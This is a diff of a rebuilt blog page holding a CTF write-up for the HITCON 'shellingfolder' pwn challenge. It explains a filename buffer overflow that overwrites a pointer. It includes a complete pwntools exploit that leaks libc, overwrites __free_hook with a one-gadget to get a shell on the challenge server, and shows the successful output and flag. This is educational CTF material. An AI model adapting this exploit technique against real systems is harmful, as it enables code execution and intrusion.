@@ -310,22 +310,22 @@
 
 <p>It’s a unix-like file system, where folders are also a special type of file. Both folders and files are stored in the program with the following data structure:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">file</span><span class="p">{</span>
-    <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">sub_file</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">// will all be null if it's a normal file
-</span>    <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">parent_folder</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">sub_file</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">// will all be null if it's a normal file</span>
+    <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">parent_folder</span><span class="p">;</span>
     <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
     <span class="kt">long</span> <span class="n">file_size</span><span class="p">;</span>
     <span class="kt">int</span> <span class="n">is_dir</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
-<p>If a folder is created, the <code class="highlighter-rouge">is_dir</code> flag will be set to <code class="highlighter-rouge">1</code>, and the <code class="highlighter-rouge">file_size</code> will be set to <code class="highlighter-rouge">0</code>. A folder is allowed to contain at most 10 <code class="highlighter-rouge">sub_file</code>. If a normal file is created ( not folder ), the <code class="highlighter-rouge">is_dir</code> flag will be set to <code class="highlighter-rouge">0</code>, and the value of <code class="highlighter-rouge">file_size</code> is set by user.</p>
+<p>If a folder is created, the <code class="language-plaintext highlighter-rouge">is_dir</code> flag will be set to <code class="language-plaintext highlighter-rouge">1</code>, and the <code class="language-plaintext highlighter-rouge">file_size</code> will be set to <code class="language-plaintext highlighter-rouge">0</code>. A folder is allowed to contain at most 10 <code class="language-plaintext highlighter-rouge">sub_file</code>. If a normal file is created ( not folder ), the <code class="language-plaintext highlighter-rouge">is_dir</code> flag will be set to <code class="language-plaintext highlighter-rouge">0</code>, and the value of <code class="language-plaintext highlighter-rouge">file_size</code> is set by user.</p>
 
 <p>There’s a <strong>buffer overflow vulnerability</strong> in the function of calculating the folder size:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">cal_folder_size</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">cur_folder</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-30h]@3
-</span>    <span class="n">__int64</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+28h] [bp-18h]@5
-</span>    <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-10h]@3
-</span>
+    <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-30h]@3</span>
+    <span class="n">__int64</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+28h] [bp-18h]@5</span>
+    <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-10h]@3</span>
+
     <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">cur_folder</span> <span class="p">)</span>
         <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
     <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
@@ -336,8 +336,8 @@
         <span class="k">if</span> <span class="p">(</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
         <span class="p">{</span>
             <span class="n">v3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">file_size</span><span class="p">;</span>
-            <span class="n">copy_file_name</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span> <span class="c1">// &lt;-- here we have a buffer overflow vulnerability
-</span>            <span class="k">if</span> <span class="p">(</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">is_dir</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+            <span class="n">copy_file_name</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span> <span class="c1">// &lt;-- here we have a buffer overflow vulnerability</span>
+            <span class="k">if</span> <span class="p">(</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">is_dir</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
             <span class="p">{</span>
                 <span class="o">*</span><span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span>
             <span class="p">}</span>
@@ -353,9 +353,9 @@
 
 <span class="p">}</span>
 </code></pre></div></div>
-<p>When we set a file’s name, we can input at most 31 characters. Inside the <code class="highlighter-rouge">cal_folder_size</code> function, the program will try to copy the file’s name into a buffer <code class="highlighter-rouge">s</code>, which its size is only 24 bytes long. The vulnerability will cause the program to overwrite the <code class="highlighter-rouge">v3</code> variable.</p>
+<p>When we set a file’s name, we can input at most 31 characters. Inside the <code class="language-plaintext highlighter-rouge">cal_folder_size</code> function, the program will try to copy the file’s name into a buffer <code class="language-plaintext highlighter-rouge">s</code>, which its size is only 24 bytes long. The vulnerability will cause the program to overwrite the <code class="language-plaintext highlighter-rouge">v3</code> variable.</p>
 
-<p>The <code class="highlighter-rouge">v3</code> variable is an <code class="highlighter-rouge">int*</code> type pointer, which points to the current folder’s <code class="highlighter-rouge">file_size</code>. Since we can overwrite this pointer, we can try to control this pointer and the size of the <code class="highlighter-rouge">sub_file[idx]</code>, so when the program execute the code at line:</p>
+<p>The <code class="language-plaintext highlighter-rouge">v3</code> variable is an <code class="language-plaintext highlighter-rouge">int*</code> type pointer, which points to the current folder’s <code class="language-plaintext highlighter-rouge">file_size</code>. Since we can overwrite this pointer, we can try to control this pointer and the size of the <code class="language-plaintext highlighter-rouge">sub_file[idx]</code>, so when the program execute the code at line:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">v3</span> <span class="o">+=</span> <span class="n">cur_folder</span><span class="o">-&gt;</span><span class="n">sub_file</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">file_size</span>
 </code></pre></div></div>
 <p><strong>it will actually let us control the value of any address.</strong></p>
@@ -364,34 +364,34 @@
 
 <ol>
   <li>Create &amp; delete some folders, so the pointer that points to the head of smallbin will appear on the heap memory.</li>
-  <li>Exploit the buffer overflow vulnerability, partial overwrite the <code class="highlighter-rouge">v3</code> pointer and make it point to a <code class="highlighter-rouge">struct file</code> pointer <code class="highlighter-rouge">p</code> ( <code class="highlighter-rouge">*v3 = p</code>).</li>
-  <li>Control a <code class="highlighter-rouge">sub_file</code>’s <code class="highlighter-rouge">file_size</code>, so when it comes to the line <code class="highlighter-rouge">*v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size</code>, it will adjust the value of <code class="highlighter-rouge">p</code>, making <code class="highlighter-rouge">p-&gt;name</code> point to the libc’s address ( address of the smallbin’s head )</li>
+  <li>Exploit the buffer overflow vulnerability, partial overwrite the <code class="language-plaintext highlighter-rouge">v3</code> pointer and make it point to a <code class="language-plaintext highlighter-rouge">struct file</code> pointer <code class="language-plaintext highlighter-rouge">p</code> ( <code class="language-plaintext highlighter-rouge">*v3 = p</code>).</li>
+  <li>Control a <code class="language-plaintext highlighter-rouge">sub_file</code>’s <code class="language-plaintext highlighter-rouge">file_size</code>, so when it comes to the line <code class="language-plaintext highlighter-rouge">*v3 += cur_folder-&gt;sub_file[idx]-&gt;file_size</code>, it will adjust the value of <code class="language-plaintext highlighter-rouge">p</code>, making <code class="language-plaintext highlighter-rouge">p-&gt;name</code> point to the libc’s address ( address of the smallbin’s head )</li>
   <li>List the files in the current folder and leak the libc’s address.</li>
 </ol>
 
-<p>After we got the libc’s address, we can use the same vulnerability to overwrite the <code class="highlighter-rouge">__free_hook</code> function pointer into the address of <strong>one gadget</strong>, and get the shell by deleting a file. Notice that <code class="highlighter-rouge">file_size</code> stores the value returned by <code class="highlighter-rouge">atoi</code>, a four-byte integer, so we’ll have to overwrite <code class="highlighter-rouge">__free_hook</code> twice : first  overwrite <code class="highlighter-rouge">__free_hook</code>,  then overwrite <code class="highlighter-rouge">__free_hook+4</code>.</p>
+<p>After we got the libc’s address, we can use the same vulnerability to overwrite the <code class="language-plaintext highlighter-rouge">__free_hook</code> function pointer into the address of <strong>one gadget</strong>, and get the shell by deleting a file. Notice that <code class="language-plaintext highlighter-rouge">file_size</code> stores the value returned by <code class="language-plaintext highlighter-rouge">atoi</code>, a four-byte integer, so we’ll have to overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code> twice : first  overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code>,  then overwrite <code class="language-plaintext highlighter-rouge">__free_hook+4</code>.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">time</span>
 
 <span class="n">HOST</span> <span class="o">=</span> <span class="s">"52.69.237.212"</span>
-<span class="c">#HOST = "127.0.0.1"</span>
-<span class="n">PORT</span> <span class="o">=</span> <span class="mi">4869</span>
+<span class="c1">#HOST = "127.0.0.1"
+</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">4869</span>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./shellingfolder_noalarm"</span>
-<span class="c">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"</span>
-<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
+<span class="c1">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
+</span><span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc.so.6"</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+<span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
@@ -408,10 +408,10 @@
 <span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
     <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">str_addr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">f</span><span class="p">):</span> <span class="c"># search string address in file</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span> <span class="c"># no result</span>
-        <span class="k">return</span> <span class="bp">None</span>
+<span class="k">def</span> <span class="nf">str_addr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">f</span><span class="p">):</span> <span class="c1"># search string address in file
+</span>    <span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span> <span class="c1"># no result
+</span>        <span class="k">return</span> <span class="bp">None</span>
     <span class="k">else</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
 
@@ -441,11 +441,11 @@
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-
-    <span class="c"># overwrite &amp;file-&gt;fize_size (address of file_size)</span>
-    <span class="c"># use cal() to let file-&gt;name point to main_arena+88</span>
-    <span class="n">make_dir</span><span class="p">(</span><span class="s">"AAAA"</span><span class="p">)</span>
+    <span class="c1">#r = process(ELF_PATH)
+</span>
+    <span class="c1"># overwrite &amp;file-&gt;fize_size (address of file_size)
+</span>    <span class="c1"># use cal() to let file-&gt;name point to main_arena+88
+</span>    <span class="n">make_dir</span><span class="p">(</span><span class="s">"AAAA"</span><span class="p">)</span>
     <span class="n">make_dir</span><span class="p">(</span><span class="s">"BBBB"</span><span class="p">)</span>
     <span class="n">make_dir</span><span class="p">(</span><span class="s">"CCCC"</span><span class="p">)</span>
     <span class="n">create_file</span><span class="p">(</span><span class="s">"F"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x10</span><span class="p">),</span> <span class="mi">64</span><span class="p">)</span>
@@ -454,17 +454,17 @@
     <span class="n">cal</span><span class="p">()</span>
     <span class="n">ls</span><span class="p">()</span>
 
-    <span class="c"># leak libc address</span>
-    <span class="c">######################## one gadget</span>
-    <span class="c"># .text:000000000004525A                 mov     rax, cs:environ_ptr_0</span>
-    <span class="c"># .text:0000000000045261                 lea     rdi, aBinSh     ; "/bin/sh"</span>
-    <span class="c"># .text:0000000000045268                 lea     rsi, [rsp+188h+var_158]</span>
-    <span class="c"># .text:000000000004526D                 mov     cs:dword_3C54A0, 0</span>
-    <span class="c"># .text:0000000000045277                 mov     cs:dword_3C54A4, 0</span>
-    <span class="c"># .text:0000000000045281                 mov     rdx, [rax]</span>
-    <span class="c"># .text:0000000000045284                 call    execve</span>
-    <span class="c">##########################</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"----------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="c1"># leak libc address
+</span>    <span class="c1">######################## one gadget
+</span>    <span class="c1"># .text:000000000004525A                 mov     rax, cs:environ_ptr_0
+</span>    <span class="c1"># .text:0000000000045261                 lea     rdi, aBinSh     ; "/bin/sh"
+</span>    <span class="c1"># .text:0000000000045268                 lea     rsi, [rsp+188h+var_158]
+</span>    <span class="c1"># .text:000000000004526D                 mov     cs:dword_3C54A0, 0
+</span>    <span class="c1"># .text:0000000000045277                 mov     cs:dword_3C54A4, 0
+</span>    <span class="c1"># .text:0000000000045281                 mov     rdx, [rax]
+</span>    <span class="c1"># .text:0000000000045284                 call    execve
+</span>    <span class="c1">##########################
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"----------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c3b78</span>
     <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4525a</span>
     <span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
@@ -474,19 +474,19 @@
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"malloc_hook: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_hook: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
 
-    <span class="c"># overwrite free_hook to one_gadet</span>
-    <span class="n">make_dir</span><span class="p">(</span><span class="s">"DDDD"</span><span class="p">)</span>
+    <span class="c1"># overwrite free_hook to one_gadet
+</span>    <span class="n">make_dir</span><span class="p">(</span><span class="s">"DDDD"</span><span class="p">)</span>
     <span class="n">change_dir</span><span class="p">(</span><span class="s">"DDDD</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="n">create_file</span><span class="p">(</span><span class="s">"i"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)[:</span><span class="mi">7</span><span class="p">:],</span> <span class="p">(</span><span class="n">one_gadget</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>
     <span class="n">create_file</span><span class="p">(</span><span class="s">"I"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="o">+</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">7</span><span class="p">:],</span> <span class="p">((</span><span class="n">one_gadget</span> <span class="o">&amp;</span> <span class="mh">0xffffffff00000000</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">))</span>
     <span class="n">cal</span><span class="p">()</span>
-    <span class="c"># get shell</span>
-    <span class="n">remove</span><span class="p">(</span><span class="s">"i"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)[:</span><span class="mi">7</span><span class="p">:])</span>
+    <span class="c1"># get shell
+</span>    <span class="n">remove</span><span class="p">(</span><span class="s">"i"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)[:</span><span class="mi">7</span><span class="p">:])</span>
     
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[x] Opening connection to 52.69.237.212 on port 4869
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[x] Opening connection to 52.69.237.212 on port 4869
 [x] Opening connection to 52.69.237.212 on port 4869: Trying 52.69.237.212
 [+] Opening connection to 52.69.237.212 on port 4869: Done
 [+] libc_base: 0x7ff15c7cc000
@@ -516,7 +516,7 @@ uid=1000(shellingfolder) gid=1000(shellingfolder) groups=1000(shellingfolder)
 hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}</code></p>
 
         
       </section>
@@ -625,7 +625,6 @@ hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -645,7 +644,6 @@ hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
 
         
           
-          
 
 
 
@@ -664,7 +662,6 @@ hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
 </div>
 
         
-          
           
 
 
@@ -687,7 +684,6 @@ hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
 
         
           
-          
 
 
 
@@ -708,6 +704,7 @@ hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
         
       </div>
     </div>
+  
   
 </div>
 
@@ -758,7 +755,7 @@ hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
